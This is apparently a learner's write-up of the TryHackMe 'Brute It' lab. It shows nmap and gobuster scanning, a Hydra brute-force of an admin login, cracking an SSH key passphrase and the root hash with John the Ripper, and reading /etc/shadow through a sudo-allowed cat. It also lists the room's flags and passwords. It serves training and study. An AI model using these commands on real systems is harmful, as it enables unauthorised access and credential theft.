# Brute It
Learn how to brute, hash cracking and escalate privileges in this box!   

### Level: Easy
### Link: https://tryhackme.com/room/bruteit
### Tools Used: 
- Nmap
- Gobuster
- Hydra
- John the Ripper

## Task 1
Search for open ports using nmap.
`nmap -sS -A <IP>`

Answer the following: 
1. How many ports are open? 
2
2. What version of SSH is running?
OpenSSH 7.6p1
3. What version of Apache is running?
2.4.29
4. Which Linux distribution is running?
Ubuntu

Then we search for hidden directories on web server.
`gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt`

1. What is the hidden directory?
/admin

## Task 2
Go to Admin page by typing `http://<IP>/admin`. View page source. Find the username there in a line `<!-- Hey, john, if you do not remember, the username is admin -->`
So, we have a user named `john` and username `admin`.

For the password,
first go to `wordlists -h`
then,
`hydra -l admin -P rockyou.txt <IP> http-post-form “/admin/:user=^USER^&pass=^PASS^:F=invalid”`
It will give us the password.

1. What is the user:password of the admin panel?
admin:xavier

Now login to the admin login page. And we find our RSA key & Web flag...also a new username

`THM{brut3_f0rce_is_e4sy}`

Download the rsa key and save as id_rsa (auto). 
Then we go to - 
`locate ssh2john.py`
`opt/john/ssh2john.py id_rsa > rsa.txt`
this will turn the rsa into a hash format so we can crack it with John the Ripper
`john rsa.txt –wordlist=/usr/share/wordlists/rockyou.txt`
This gives us the private key passphrase.
`rockinroll  (id_rsa)`

With tis, we can login to John's computer. 
To do that, first we type `chmod 600 id_rsa`
Then, `ssh -i id_rsa john@10.112.185.180`
Voila! We're in!

There’s the user.txt file which we can view with `ls` and we can cat it with `cat user.txt`.
It gives us the flag 
`THM{a_password_is_not_a_barrier}`

## Task 3: Privilege Escalation
First we check `sudo -l` to figure out what commands are allowed. We see the binary file `/bin/cat` which is the genral unix file that reads or concatenate files.

Then we type `cat /etc/shadow`. Here `/etc/shadow` is the file system in Linux where the OS encrypts all the passwords and store them.

SInce, we're looking for the root's password, which usually is the first line. So view the first line is the root hash and let’s save it to roothash
`echo root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbL. > roothash`
and type `john --wordlist=/usr/share/wordlists/rockyou.txt roothash` to execute the hash to get the password.

1. What is the root's password? `football`

So, we can login as root now. There's the `root.txt` file which we can read through `sudo cat /root/root.txt` which gives us the last flag `THM{pr1v1l3g3_3sc4l4t10n}`

The End 

Notes: personally, I struggled with Privilege Escalation a bit which was completely new to me. Hopefully, I get more practice in regarding this. 


## Short Explanations
`nmap -sS -A <IP>`: `-sS` is `tcp SYN` scan which can scan a lot of ports very quickly & stealthily. `-A` is agressive scanning which can detect OS, version scanning `-sV`, script scanning `-sC`, traceroute `--traceroute`. So it is a very versatile flag that can do a lot of things at once.<br>
`gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt`: Busts directory of the target IP with the commontext wordlist as a reference.<br>
`hydra -l admin -P rockyou.txt <IP> http-post-form “/admin/:user=^USER^&pass=^PASS^:F=invalid”`: Hydra cracks password of `-l admin` trying passwords from rockyou.txt `-P rockyou.txt`.<br>
P.S. John the ripper does almost the same, but cracks hashses too. <br>

ganbare <3
